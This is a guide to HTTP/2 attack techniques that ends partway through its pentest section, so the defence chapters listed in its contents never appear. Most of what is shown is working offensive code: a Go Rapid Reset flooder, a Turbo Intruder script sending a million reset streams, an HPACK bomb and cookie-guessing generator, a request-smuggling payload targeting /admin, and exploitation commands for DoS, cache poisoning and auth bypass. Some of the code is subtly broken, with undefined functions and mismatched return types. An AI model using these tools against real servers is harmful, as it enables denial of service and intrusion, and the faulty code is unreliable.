# HTTP/2 Attack Techniques, Exploitation Tools, and Defenses

## Table of Contents
1. [Offensive HTTP/2 Attack Tools](#offensive-tools)
2. [HTTP/2 Fuzzing Techniques](#fuzzing-techniques)
3. [Penetration Testing Methodology](#penetration-testing)
4. [Request Smuggling Exploitation](#request-smuggling)
5. [PoC Exploit Code Analysis](#poc-exploits)
6. [Real-World Attack Campaigns](#real-world-attacks)
7. [nginx HTTP/2 Hardening](#nginx-hardening)
8. [Apache httpd HTTP/2 Hardening](#apache-hardening)
9. [WAF Rules for HTTP/2](#waf-rules)
10. [Rate Limiting Strategies](#rate-limiting)
11. [Monitoring and Detection](#monitoring-detection)
12. [CDN-Level Mitigations](#cdn-mitigations)
13. [Security Headers with HTTP/2](#security-headers)

---

## 1. Offensive HTTP/2 Attack Tools {#offensive-tools}

### 1.1 Protocol Testing and Validation Tools

#### h2spec - HTTP/2 Protocol Conformance Testing
**Description**: Official HTTP/2 protocol test suite that validates implementation compliance with RFC 7540.

**Installation**:
```bash
# Install from source
git clone https://github.com/summerwind/h2spec.git
cd h2spec
go build

# Or install via package manager
brew install h2spec  # macOS
apt install h2spec   # Debian/Ubuntu
```

**Usage Examples**:
```bash
# Test a server on standard HTTPS port
h2spec https://example.com

# Test specific test cases
h2spec -t -k -v -p 443 example.com

# Test cleartext HTTP/2 (h2c)
h2spec http://example.com:8080

# Run specific test categories
h2spec -t 4.2  # Test stream states
h2spec -t 6.5  # Test frame definitions
```

**Key Attack Tests**:
- **Stream state manipulation**: Test improper state transitions
- **Frame size validation**: Test maximum frame size handling
- **Flow control attacks**: Test window update manipulation
- **Priority attacks**: Test stream dependency manipulation
- **Continuation frame attacks**: Test header block fragmentation

#### nghttp2 - HTTP/2 Client, Server, and Tools
**Description**: Comprehensive HTTP/2 implementation with client, server, proxy, and benchmarking tools.

**Installation**:
```bash
# Ubuntu/Debian
apt install nghttp2-client nghttp2-server

# macOS
brew install nghttp2

# From source
git clone https://github.com/nghttp2/nghttp2.git
cd nghttp2
autoreconf -i
automake
autoconf
./configure
make
sudo make install
```

**Attack Tools in nghttp2 Suite**:

1. **nghttp - HTTP/2 Client**:
```bash
# Basic connection test
nghttp -v https://example.com

# Send custom headers
nghttp -H "X-Attack-Header: malicious" https://example.com

# Test with different HTTP versions
nghttp --no-tls --http2-only http://example.com:8080

# Performance testing with multiple streams
nghttp -n 1000 -c 10 https://example.com
```

2. **h2load - HTTP/2 Benchmarking Tool**:
```bash
# Basic load test
h2load -n 100000 -c 100 -m 10 https://example.com

# Test with different stream counts
h2load -n 100000 -c 50 -m 100 --max-concurrent-streams=1000 https://example.com

# Test with custom headers
h2load -n 50000 -c 20 -H "X-Attack: test" https://example.com

# Output detailed timing information
h2load -n 10000 -c 10 -t 4 -v https://example.com
```

3. **nghttpx - HTTP/2 Proxy**:
```bash
# Set up a malicious proxy for testing
nghttpx --frontend=0.0.0.0,8443 --backend=target-server,443 \
  --insecure --http2-proxy

# Proxy with TLS termination
nghttpx --frontend=0.0.0.0,443 --backend=localhost,8080 \
  --certificate=/path/to/cert.pem --private-key=/path/to/key.pem
```

#### curl with HTTP/2 Support
**Description**: curl with HTTP/2 support enables manual testing and exploitation.

**Usage**:
```bash
# Force HTTP/2 usage
curl --http2 https://example.com

# Verbose output showing HTTP/2 frames
curl --http2 -v https://example.com

# Test with specific HTTP/2 settings
curl --http2 --http2-prior-knowledge http://example.com:8080

# Send custom frames (requires curl built with nghttp2)
curl --http2 -H "X-Custom: header" https://example.com
```

### 1.2 Specialized Attack Tools

#### h2csmuggler - HTTP/2 Request Smuggling Tool
**Description**: Tool for detecting and exploiting HTTP/2 request smuggling vulnerabilities (H2.CL and H2.TE).

**Installation**:
```bash
git clone https://github.com/BishopFox/h2csmuggler.git
cd h2csmuggler
pip3 install -r requirements.txt
```

**Usage**:
```bash
# Basic detection
python3 h2csmuggler.py -x https://target.com

# Test specific endpoints
python3 h2csmuggler.py -x https://target.com/api/v1/endpoint

# Use custom wordlist for fuzzing
python3 h2csmuggler.py -x https://target.com -w paths.txt

# Test with different techniques
python3 h2csmuggler.py -x https://target.com --test h2cl
python3 h2csmuggler.py -x https://target.com --test h2te
```

**Attack Techniques Implemented**:

1. **H2.CL Attack**:
```python
# Content-Length smuggling via HTTP/2
headers = [
    (':method', 'POST'),
    (':path', '/vulnerable'),
    (':authority', 'target.com'),
    ('content-length', '0'),
    ('transfer-encoding', 'chunked'),
]
# Send request with conflicting headers
```

2. **H2.TE Attack**:
```python
# Transfer-Encoding smuggling
headers = [
    (':method', 'POST'),
    (':path', '/api'),
    ('transfer-encoding', 'chunked'),
]
# Followed by smuggled request in body
```

#### Turbo Intruder with HTTP/2 Support
**Description**: Burp Suite extension for high-speed attack payload delivery with HTTP/2 support.

**Installation**:
1. Install from BApp Store in Burp Suite
2. Or download from: https://github.com/PortSwigger/turbo-intruder

**Configuration for HTTP/2 Attacks**:
```python
# Turbo Intruder script for HTTP/2 Rapid Reset
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=100,
                          requestsPerConnection=1000,
                          pipeline=False,
                          maxRetriesPerRequest=0,
                          engine=Engine.HTTP2)
    
    # Rapid Reset attack pattern
    for i in range(1000000):
        request = '''HEADERS
:method: GET
:path: /
:authority: target.com
:scheme: https

RST_STREAM
'''
        engine.queue(request, str(i))

def handleResponse(req, interesting):
    # Discard responses to avoid blocking
    pass
```

**Attack Templates**:
- **HTTP/2 Rapid Reset**: Flood with HEADERS+RST_STREAM pairs
- **HPACK Bomb**: Send headers that expand massively when decompressed
- **Stream Exhaustion**: Open maximum streams without closing
- **Priority Inversion**: Manipulate stream dependencies

#### Burp Suite HTTP/2 Support
**Description**: Native HTTP/2 support in Burp Suite Professional for manual testing.

**Configuration**:
1. **Proxy Settings**:
   - Enable "Use HTTP/2" in Proxy → Options → TLS
   - Configure ALPN preferences

2. **Repeater with HTTP/2**:
   - Send requests with HTTP/2 directly
   - View raw HTTP/2 frames in "Raw" tab

3. **Intruder with HTTP/2**:
   - Use HTTP/2 for attack payloads
   - Configure concurrent streams

**Attack Workflows**:
1. **Manual Request Smuggling**:
   - Craft conflicting Content-Length and Transfer-Encoding headers
   - Send via Repeater with HTTP/2 enabled
   - Observe backend behavior

2. **HPACK Analysis**:
   - Send repeated headers to analyze compression
   - Monitor dynamic table usage
   - Test for compression oracle vulnerabilities

### 1.3 Custom Attack Tools

#### HTTP/2 Rapid Reset Attack Tool
**Source Code Analysis from Existing Setup**:

```go
// rapid_reset.go - Core attack logic
package main

import (
    "crypto/tls"
    "fmt"
    "net"
    "sync/atomic"
    "time"
)

func main() {
    target := "target.com:443"
    connections := 100
    batchSize := 1000
    
    for i := 0; i < connections; i++ {
        go attackConnection(target, batchSize)
    }
    
    // Keep running
    select {}
}

func attackConnection(target string, batchSize int) {
    // Establish TLS with HTTP/2
    conn, err := tls.Dial("tcp", target, &tls.Config{
        NextProtos: []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err != nil {
        return
    }
    
    // Send HTTP/2 preface
    conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
    
    // Send initial SETTINGS
    settingsFrame := createSettingsFrame()
    conn.Write(settingsFrame)
    
    streamID := 1
    for {
        batch := make([]byte, 0, batchSize*22)
        
        for i := 0; i < batchSize; i++ {
            // HEADERS frame (9 bytes)
            headers := createHeadersFrame(streamID)
            batch = append(batch, headers...)
            
            // RST_STREAM frame (13 bytes)
            rst := createRstStreamFrame(streamID)
            batch = append(batch, rst...)
            
            streamID += 2
        }
        
        conn.Write(batch)
        time.Sleep(time.Microsecond * 100)
    }
}
```

**Enhanced Version (rapid_v2.go)**:
```go
// Enhanced features:
// 1. Connection pooling with health checks
// 2. Adaptive batch sizing based on latency
// 3. Response draining to avoid blocking
// 4. Statistics collection
// 5. Graceful degradation under backpressure

type AttackStats struct {
    RequestsSent    uint64
    BytesSent       uint64
    Connections     int32
    Errors          uint64
}

func createHeadersFrame(streamID uint32) []byte {
    // Minimal HEADERS frame for attack
    // 9 bytes: 3 bytes length, 1 byte type, 1 byte flags, 4 bytes stream ID
    frame := make([]byte, 9)
    
    // Length: 0 (no payload for minimal attack)
    frame[0] = 0x00
    frame[1] = 0x00
    frame[2] = 0x00
    
    // Type: HEADERS (0x01)
    frame[3] = 0x01
    
    // Flags: END_STREAM (0x01) + END_HEADERS (0x04)
    frame[4] = 0x05
    
    // Stream ID
    frame[5] = byte(streamID >> 24)
    frame[6] = byte(streamID >> 16)
    frame[7] = byte(streamID >> 8)
    frame[8] = byte(streamID)
    
    return frame
}

func createRstStreamFrame(streamID uint32) []byte {
    // RST_STREAM frame (13 bytes total)
    frame := make([]byte, 13)
    
    // Length: 4 (error code payload)
    frame[0] = 0x00
    frame[1] = 0x00
    frame[2] = 0x04
    
    // Type: RST_STREAM (0x03)
    frame[3] = 0x03
    
    // Flags: 0x00
    frame[4] = 0x00
    
    // Stream ID
    frame[5] = byte(streamID >> 24)
    frame[6] = byte(streamID >> 16)
    frame[7] = byte(streamID >> 8)
    frame[8] = byte(streamID)
    
    // Error code: NO_ERROR (0x00)
    frame[9] = 0x00
    frame[10] = 0x00
    frame[11] = 0x00
    frame[12] = 0x00
    
    return frame
}
```

#### HPACK Bomb Generator
**Tool for HPACK Compression Attacks**:
```python
#!/usr/bin/env python3
# hpack_bomb.py - Generate HPACK bombs

import base64
import sys

def generate_hpack_bomb(num_headers=1000):
    """Generate headers that expand massively when decompressed"""
    
    # Headers that will be indexed in dynamic table
    headers = []
    
    # Create headers with similar prefixes to maximize compression
    base_header = "X-Custom-Header-"
    
    for i in range(num_headers):
        # Each header value is the previous value + new character
        # This creates optimal conditions for compression oracle attacks
        value = "A" * (i % 1000)  # Varying lengths
        
        headers.append((f"{base_header}{i}", value))
    
    return headers

def create_crime_attack_payload():
    """Create payload for CRIME attack"""
    
    # CRIME attack exploits compression ratio to guess secrets
    payload = []
    
    # Known prefix
    payload.append(("Cookie", "session="))
    
    # Guess characters
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload.append(("X-Test", f"session={char}"))
    
    return payload

if __name__ == "__main__":
    # Generate HPACK bomb
    bomb = generate_hpack_bomb(100)
    
    # Output as curl command
    print("curl --http2 \\")
    for name, value in bomb:
        print(f"  -H '{name}: {value}' \\")
    print("  https://target.com")
```

---

## 2. HTTP/2 Fuzzing Techniques {#fuzzing-techniques}

### 2.1 Protocol-Level Fuzzing

#### AFL (American Fuzzy Lop) for HTTP/2
**Setup for Fuzzing HTTP/2 Implementations**:

```bash
# Install AFL
sudo apt install afl

# Clone and build nghttp2 for fuzzing
git clone https://github.com/nghttp2/nghttp2.git
cd nghttp2

# Build with AFL instrumentation
CC=afl-gcc CXX=afl-g++ ./configure --enable-fuzzer
make

# Prepare seed corpus
mkdir -p seeds/
echo "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" > seeds/http2_preface

# Start fuzzing
afl-fuzz -i seeds/ -o findings/ ./fuzzer @@
```

**Custom HTTP/2 Fuzzer**:
```c
// http2_fuzzer.c - Custom AFL fuzzer for HTTP/2
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// AFL entry point
int LLVMFuzzTestOneInput(const uint8_t *data, size_t size) {
    if (size < 9) return 0;  // Minimum frame size
    
    // Parse as HTTP/2 frame
    uint32_t length = (data[0] << 16) | (data[1] << 8) | data[2];
    uint8_t type = data[3];
    uint8_t flags = data[4];
    uint32_t stream_id = (data[5] << 24) | (data[6] << 16) | 
                         (data[7] << 8) | data[8];
    
    // Test different frame types
    switch(type) {
        case 0x00: // DATA
            test_data_frame(data, size);
            break;
        case 0x01: // HEADERS
            test_headers_frame(data, size);
            break;
        case 0x03: // RST_STREAM
            test_rst_stream_frame(data, size);
            break;
        case 0x08: // WINDOW_UPDATE
            test_window_update_frame(data, size);
            break;
    }
    
    return 0;
}
```

#### libFuzzer Integration
**Google's libFuzzer for HTTP/2**:

```c++
// http2_libfuzzer.cc - libFuzzer target
#include <fuzzer/FuzzedDataProvider.h>
#include "http2_adapter.h"

extern "C" int LLVMFuzzTestOneInput(const uint8_t *data, size_t size) {
    FuzzedDataProvider provider(data, size);
    
    // Parse frames from fuzzed input
    while (provider.remaining_bytes() > 0) {
        // Generate random frame
        uint32_t length = provider.ConsumeIntegralInRange<uint32_t>(0, 16384);
        uint8_t type = provider.ConsumeIntegral<uint8_t>();
        uint8_t flags = provider.ConsumeIntegral<uint8_t>();
        uint32_t stream_id = provider.ConsumeIntegral<uint32_t>();
        
        std::vector<uint8_t> payload = provider.ConsumeBytes<uint8_t>(length);
        
        // Test frame processing
        process_http2_frame(type, flags, stream_id, payload.data(), length);
    }
    
    return 0;
}
```

### 2.2 Frame Mutation Fuzzing

**HTTP/2 Frame Mutator**:
```python
#!/usr/bin/env python3
# http2_frame_mutator.py

import struct
import random
import os

class HTTP2FrameMutator:
    def __init__(self):
        self.frame_types = {
            0x00: "DATA",
            0x01: "HEADERS",
            0x02: "PRIORITY",
            0x03: "RST_STREAM",
            0x04: "SETTINGS",
            0x05: "PUSH_PROMISE",
            0x06: "PING",
            0x07: "GOAWAY",
            0x08: "WINDOW_UPDATE",
            0x09: "CONTINUATION"
        }
    
    def mutate_frame(self, frame):
        """Mutate HTTP/2 frame for fuzzing"""
        
        if len(frame) < 9:
            return self.generate_random_frame()
        
        # Parse frame header
        length = struct.unpack('!I', b'\x00' + frame[0:3])[0]
        frame_type = frame[3]
        flags = frame[4]
        stream_id = struct.unpack('!I', frame[5:9])[0]
        
        # Apply mutations
        mutation = random.choice([
            self.mutate_length,
            self.mutate_type,
            self.mutate_flags,
            self.mutate_stream_id,
            self.mutate_payload,
            self.corrupt_frame
        ])
        
        return mutation(frame, length, frame_type, flags, stream_id)
    
    def mutate_length(self, frame, length, frame_type, flags, stream_id):
        """Mutate frame length"""
        new_length = random.randint(0, 16777215)  # Max 24-bit
        
        # Reconstruct frame with new length
        new_frame = struct.pack('!I', new_length)[1:]  # 3 bytes
        new_frame += bytes([frame_type, flags])
        new_frame += struct.pack('!I', stream_id)
        
        # Keep or modify payload
        if len(frame) > 9:
            payload = frame[9:9+min(length, len(frame)-9)]
            if len(payload) > new_length:
                payload = payload[:new_length]
            elif len(payload) < new_length:
                payload += os.urandom(new_length - len(payload))
            new_frame += payload
        
        return new_frame
    
    def generate_random_frame(self):
        """Generate completely random frame"""
        length = random.randint(0, 16384)
        frame_type = random.randint(0, 9)
        flags = random.randint(0, 255)
        stream_id = random.randint(0, 2**31-1)
        
        frame = struct.pack('!I', length)[1:]
        frame += bytes([frame_type, flags])
        frame += struct.pack('!I', stream_id)
        frame += os.urandom(length)
        
        return frame
    
    def mutate_type(self, frame, length, frame_type, flags, stream_id):
        """Mutate frame type"""
        new_type = random.randint(0, 9)
        
        new_frame = struct.pack('!I', length)[1:]
        new_frame += bytes([new_type, flags])
        new_frame += struct.pack('!I', stream_id)
        
        if len(frame) > 9:
            new_frame += frame[9:9+length]
        
        return new_frame
    
    def corrupt_frame(self, frame, length, frame_type, flags, stream_id):
        """Corrupt frame with random bytes"""
        corruption_point = random.randint(0, len(frame)-1)
        corruption_amount = random.randint(1, 10)
        
        new_frame = bytearray(frame)
        for i in range(corruption_amount):
            if corruption_point + i < len(new_frame):
                new_frame[corruption_point + i] = random.randint(0, 255)
        
        return bytes(new_frame)

### 2.3 Stateful Fuzzing

**HTTP/2 Connection State Fuzzer**:
```python
class HTTP2StatefulFuzzer:
    def __init__(self):
        self.states = {
            'idle', 'reserved_local', 'reserved_remote',
            'open', 'half_closed_local', 'half_closed_remote',
            'closed'
        }
        self.current_state = 'idle'
        self.streams = {}
    
    def fuzz_connection(self):
        """Fuzz entire HTTP/2 connection state machine"""
        
        test_cases = []
        
        # Test state transitions
        for _ in range(1000):
            # Choose random action
            action = random.choice([
                self.send_headers,
                self.send_data,
                self.send_rst_stream,
                self.send_window_update,
                self.send_ping,
                self.send_settings,
                self.send_goaway
            ])
            
            # Generate test case
            frames = action()
            test_cases.append(frames)
            
            # Update state
            self.update_state(frames)
        
        return test_cases
    
    def send_headers(self):
        """Generate HEADERS frame with fuzzed parameters"""
        stream_id = self.get_valid_stream_id()
        
        # Fuzz headers
        headers = []
        num_headers = random.randint(1, 100)
        
        for i in range(num_headers):
            name = self.fuzz_string(random.randint(1, 100))
            value = self.fuzz_string(random.randint(0, 1000))
            headers.append((name, value))
        
        return self.build_headers_frame(stream_id, headers)
    
    def fuzz_string(self, length):
        """Generate fuzzed string"""
        chars = []
        for _ in range(length):
            # Include null bytes, unicode, etc.
            char_type = random.choice(['ascii', 'null', 'unicode', 'control'])
            
            if char_type == 'ascii':
                chars.append(chr(random.randint(32, 126)))
            elif char_type == 'null':
                chars.append('\x00')
            elif char_type == 'unicode':
                chars.append(chr(random.randint(0x80, 0xFFFF)))
            else:  # control
                chars.append(chr(random.randint(0, 31)))
        
        return ''.join(chars)
```

### 2.4 Differential Fuzzing

**Compare Implementations**:
```python
#!/usr/bin/env python3
# http2_differential_fuzzer.py

import subprocess
import difflib

class HTTP2DifferentialFuzzer:
    def __init__(self, implementations):
        """
        implementations: dict of name -> command
        Example: {'nginx': 'nginx -c config.conf', 'apache': 'httpd -f config.conf'}
        """
        self.implementations = implementations
        self.differences = []
    
    def fuzz_and_compare(self, num_tests=1000):
        """Generate tests and compare implementation responses"""
        
        for test_num in range(num_tests):
            test_input = self.generate_test()
            
            responses = {}
            for name, cmd in self.implementations.items():
                response = self.run_test(name, cmd, test_input)
                responses[name] = response
            
            # Compare responses
            if not self.responses_equal(responses):
                self.differences.append({
                    'test': test_input,
                    'responses': responses
                })
        
        return self.differences
    
    def generate_test(self):
        """Generate random HTTP/2 test case"""
        # Generate random frames, headers, etc.
        test = {
            'frames': [],
            'headers': [],
            'settings': {}
        }
        
        # Add random frames
        num_frames = random.randint(1, 10)
        for _ in range(num_frames):
            frame = self.generate_random_frame()
            test['frames'].append(frame)
        
        return test
    
    def responses_equal(self, responses):
        """Check if all implementations gave same response"""
        if len(responses) < 2:
            return True
        
        first_response = list(responses.values())[0]
        for response in responses.values():
            if response != first_response:
                return False
        
        return True
```

---

## 3. Penetration Testing Methodology {#penetration-testing}

### 3.1 HTTP/2 Security Assessment Checklist

#### Phase 1: Reconnaissance
```bash
# 1. Identify HTTP/2 support
curl -I --http2 https://target.com 2>/dev/null | grep -i "http/2"
nmap --script http2-security-check -p 443 target.com

# 2. Check for h2c (cleartext HTTP/2)
nmap -sV --script http2-cleartext -p 80 target.com

# 3. Enumerate supported TLS versions and cipher suites
testssl.sh target.com:443
sslscan target.com:443

# 4. Check for HTTP/2 on alternative ports
for port in 8080 8443 9443; do
    curl --http2-prior-knowledge https://target.com:$port 2>/dev/null && echo "HTTP/2 on port $port"
done

# 5. Identify server software
whatweb https://target.com
curl -I https://target.com | grep -i "server:"
```

#### Phase 2: Protocol Testing
```bash
# 1. Protocol compliance testing
h2spec https://target.com

# 2. Frame validation testing
python3 http2_fuzzer.py --target https://target.com --test frames

# 3. State machine testing
python3 http2_state_tester.py --target https://target.com

# 4. HPACK compression testing
python3 hpack_test.py --target https://target.com

# 5. Connection coalescing testing
curl --http2 --resolve "www.target.com:443:IP" --resolve "static.target.com:443:IP" https://www.target.com
```

#### Phase 3: Vulnerability Assessment
```bash
# 1. Rapid Reset vulnerability testing
./rapid_reset --target https://target.com --test

# 2. Request smuggling testing
python3 h2csmuggler.py -x https://target.com

# 3. HPACK bomb testing
./hpack_bomb.py --target https://target.com

# 4. Resource exhaustion testing
./stream_exhaustion.py --target https://target.com --streams 1000

# 5. Priority inversion testing
./priority_attack.py --target https://target.com

# 6. Flow control manipulation
./flow_control_attack.py --target https://target.com
```

#### Phase 4: Exploitation
```bash
# 1. Attempt Rapid Reset DoS
./rapid_reset --target https://target.com --connections 100 --duration 60

# 2. Attempt request smuggling
python3 h2csmuggler.py -x https://target.com --exploit

# 3. Test for HPACK oracle
./hpack_oracle.py --target https://target.com --guess-header "Cookie"

# 4. Test for cache poisoning
./cache_poisoning.py --target https://target.com

# 5. Test for authentication bypass
./auth_bypass.py --target https://target.com
```

### 3.2 Manual Testing Techniques

#### Burp Suite Manual Tests

1. **HPACK Analysis**:
   - Send repeated requests with same headers
   - Monitor request sizes for compression
   - Test with `never-index` literals
   - Check for compression oracle vulnerabilities

2. **Stream Manipulation**:
   - Open maximum concurrent streams
   - Create circular dependencies
   - Test priority reassignment
   - Manipulate stream dependencies

3. **Frame Injection**:
   - Inject frames mid-request
   - Send out-of-order frames
   - Test with malformed frames
   - Send frames with invalid lengths

4. **Header Validation**:
   - Test with overly long headers
   - Test with binary headers
   - Test header name/value boundaries
   - Test with duplicate headers

5. **TLS/HTTP/2 Interaction**:
   - Test ALPN downgrade attacks
   - Test with different cipher suites
   - Test TLS renegotiation
   - Test session resumption

#### Custom Test Scripts

**HTTP/2 Security Scanner**:
```python
#!/usr/bin/env python3
# http2_security_scanner.py

import ssl
import socket
import struct
import time
from h2.connection import H2Connection
from h2.config import H2Configuration

class HTTP2SecurityScanner:
    def __init__(self, host, port=443):
        self.host = host
        self.port = port
        self.results = {}
    
    def scan(self):
        """Run comprehensive HTTP/2 security scan"""
        
        print(f"[*] Scanning {self.host}:{self.port}")
        
        # Test 1: Basic HTTP/2 support
        self.test_http2_support()
        
        # Test 2: Protocol compliance
        self.test_protocol_compliance()
        
        # Test 3: Rapid Reset vulnerability
        self.test_rapid_reset()
        
        # Test 4: Request smuggling
        self.test_request_smuggling()
        
        # Test 5: HPACK vulnerabilities
        self.test_hpack()
        
        # Test 6: Resource exhaustion
        self.test_resource_exhaustion()
        
        # Test 7: TLS configuration
        self.test_tls_configuration()
        
        # Test 8: Connection management
        self.test_connection_management()
        
        return self.results
    
    def test_rapid_reset(self):
        """Test for Rapid Reset vulnerability"""
        print("[*] Testing Rapid Reset vulnerability")
        
        try:
            # Establish HTTP/2 connection
            conn = self.create_connection()
            
            # Send rapid reset pattern
            requests_sent = 0
            start_time = time.time()
            
            for i in range(1000):
                stream_id = conn.get_next_available_stream_id()
                
                # Send HEADERS
                headers = [
                    (':method', 'GET'),
                    (':path', '/'),
                    (':authority', self.host),
                    (':scheme', 'https'),
                ]
                conn.send_headers(stream_id, headers)
                
                # Immediately reset
                conn.reset_stream(stream_id)
                requests_sent += 1
            
            end_time = time.time()
            rps = requests_sent / (end_time - start_time)
            
            print(f"[*] Sent {requests_sent} requests in {end_time-start_time:.2f}s ({rps:.0f} RPS)")
            
            if rps > 10000:  # Arbitrary threshold
                self.results['rapid_reset'] = 'HIGHLY_VULNERABLE'
            elif rps > 1000:
                self.results['rapid_reset'] = 'POTENTIALLY_VULNERABLE'
            else:
                self.results['rapid_reset'] = 'LIKELY_PATCHED'
            
        except Exception as e:
            self.results['rapid_reset'] = f'ERROR: {str(e)}'
    
    def test_request_smuggling(self):
        """Test for HTTP/2 request smuggling"""
        print("[*] Testing request smuggling")
        
        # Test H2.CL
        self.test_h2cl_smuggling()
        
        # Test H2.TE
        self.test_h2te_smuggling()
        
        # Test header spacing
        self.test_header_spacing()
    
    def test_h2cl_smuggling(self):
        """Test H2.CL request smuggling"""
        try:
            conn = self.create_connection()
            stream_id = conn.get_next_available_stream_id()
            
            # Send request with conflicting headers
            headers = [
                (':method', 'POST'),
                (':path', '/'),
                (':authority', self.host),
                (':scheme', 'https'),
                ('content-length', '0'),
                ('transfer-encoding', 'chunked'),
            ]
            
            conn.send_headers(stream_id, headers, end_stream=False)
            
            # Send body that smuggles another request
            smuggled = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: backend\r\n\r\n"
            conn.send_data(stream_id, smuggled.encode(), end_stream=True)
            
            # Check response
            response = conn.receive_response(stream_id, timeout=5)
            
            if response and b'admin' in response:
                self.results['h2cl_smuggling'] = 'VULNERABLE'
            else:
                self.results['h2cl_smuggling'] = 'NOT_VULNERABLE'
            
        except Exception as e:
            self.results['h2cl_smuggling'] = f'ERROR: {str(e)}'
    
    def test_hpack(self):
        """Test HPACK vulnerabilities"""
        print("[*] Testing HPACK vulnerabilities")
        
        try:
            # Test 1: HPACK bomb
            conn = self.create_connection()
            stream_id = conn.get_next_available_stream_id()
            
            # Send many similar headers to fill dynamic table
            headers = [(':method', 'GET'), (':path', '/'), (':authority', self.host)]
            
            for i in range(100):
                headers.append((f'X-Custom-{i}', 'A' * 1000))
            
            conn.send_headers(stream_id, headers)
            
            # Send second request that references table entries
            stream_id2 = conn.get_next_available_stream_id()
            headers2 = [(':method', 'GET'), (':path', '/test'), (':authority', self.host)]
            
            # Add references to previous headers
            for i in range(50):
                headers2.append((f'X-Custom-{i}', ''))  # Empty value references table
            
            conn.send_headers(stream_id2, headers2)
            
            # Monitor response size and timing
            response1 = conn.receive_response(stream_id, timeout=5)
            response2 = conn.receive_response(stream_id2, timeout=5)
            
            if response2 and len(response2) < len(response1) / 2:
                self.results['hpack_compression'] = 'WORKING'
            else:
                self.results['hpack_compression'] = 'NOT_WORKING'
            
            # Test 2: Never-index validation
            stream_id3 = conn.get_next_available_stream_id()
            headers3 = [
                (':method', 'GET'),
                (':path', '/'),
                (':authority', self.host),
                ('cookie', 'secret=value'),  # Should be marked never-index
            ]
            
            conn.send_headers(stream_id3, headers3)
            
            self.results['hpack_never_index'] = 'TESTED'
            
        except Exception as e:
            self.results['hpack'] = f'ERROR: {str(e)}'
    
    def create_connection(self):
        """Create HTTP/2 connection"""
        # Create SSL context
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(['h2'])
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # Create socket
        sock = socket.create_connection((self.host, self.port))
        ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host)
        
        # Create H2 connection
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        
        # Send connection preface
        ssl_sock.send(conn.data_to_send())
        
        return conn, ssl_sock

# Usage
if __name__ == "__main__":
    scanner = HTTP2SecurityScanner("target.com")
    results = scanner.scan()
    
    print("\n=== Scan Results ===")
    for test, result in results.items():
        print(f"{test}: {result}")
```

### 3.3 Automated Testing Framework

**HTTP/2 Pentest Framework**:
```python
# http2_pentest_framework.py

import asyncio
import aiohttp
import json
from abc import ABC, abstractmethod
from datetime import datetime

class HTTP2Test(ABC):
    """Base class for HTTP/2 security tests"""
    
    def __init__(self, target, name):
        self.target = target
        self.name = name
        self.session = None
        self.results = {}
    
    @abstractmethod
    async def run(self):
        """Run the test"""
        pass
    
    async def create_session(self):
        """Create HTTP/2 session"""
        connector = aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            enable_cleanup_closed=True
        )
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )
    
    async def close_session(self):
        """Close session"""
        if self.session:
            await self.session.close()
    
    def save_results(self):
        """Save test results"""
        timestamp = datetime.now().isoformat()
        filename = f"results/{self.name}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        return filename

class RapidResetTest(HTTP2Test):
    """Test for Rapid Reset vulnerability"""
    
    def __init__(self, target):
        super().__init__(target, "rapid_reset")
    
    async def run(self):
        print(f"[*] Starting Rapid Reset test against {self.target}")
        
        await self.create_session()
        
        try:
            # Open multiple connections
            tasks = []
            for i in range(10):
                task = asyncio.create_task(self.attack_connection(i))
                tasks.append(task)
            
            # Run for 10 seconds
            await asyncio.sleep(10)
            
            # Cancel tasks
            for task in tasks:
                task.cancel()
            
            # Wait for cancellation
            await asyncio.gather(*tasks, return_exceptions=True)
            
            self.results = {
                "status": "completed",
                "connections": 10,
                "duration": 10,
                "target": self.target,
                "timestamp": datetime.now().isoformat()
            }
            
            return self.results
            
        except Exception as e:
            self.results = {
                "status": "error",
                "error": str(e),
                "target": self.target
            }
            return self.results
        finally:
            await self.close_session()
    
    async def attack_connection(self, conn_id):
        """Single connection attack"""
        try:
            async with self.session.get(self.target) as response:
                print(f"[*] Connection {conn_id} established")
                
                # In real implementation, would send raw HTTP/2 frames
                # This is a simplified version
                start_time = asyncio.get_event_loop().time()
                
                while asyncio.get_event_loop().time() - start_time < 10:
                    # Simulate sending requests
                    await asyncio.sleep(0.001)  # 1000 RPS per connection
                    
        except Exception as e:
            print(f"[!] Connection {conn_id} error: {e}")

class RequestSmugglingTest(HTTP2Test):
    """Test for request smuggling"""
    
    def __init__(self, target):
        super().__init__(target, "request_smuggling")
        self.test_cases = [
            ("h2cl", self.test_h2cl),
            ("h2te", self.test_h2te),
            ("header_spacing", self.test_header_spacing),
            ("transfer_encoding", self.test_transfer_encoding)
        ]
    
    async def run(self):
        print(f"[*] Starting Request Smuggling tests against {self.target}")
        
        await self.create_session()
        
        try:
            results = {}
            for test_name, test_func in self.test_cases:
                print(f"[*] Running {test_name} test")
                result = await test_func()
                results[test_name] = result
            
            self.results = {
                "status": "completed",
                "tests": results,
                "target": self.target,
                "timestamp": datetime.now().isoformat()
            }
            
            return self.results
            
        except Exception as e:
            self.results = {
                "status": "error",
                "error": str(e),
                "target": self.target
            }
            return self.results
        finally:
            await self.close_session()
    
    async def test_h2cl(self):
        """Test H2.CL smuggling"""
        headers = {
            'Content-Length': '0',
            'Transfer-Encoding': 'chunked'
        }
        
        try:
            async with self.session.post(self.target, headers=headers) as response:
                # Analyze response for smuggling indicators
                text = await response.text()
                
                # Check for anomalies
                if response.status == 200 and len(text) > 0:
                    return {"status": "possible", "response_length": len(text)}
                else:
                    return {"status": "unlikely", "status_code": response.status}
        
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    async def test_h2te(self):
        """Test H2.TE smuggling"""
        headers = {
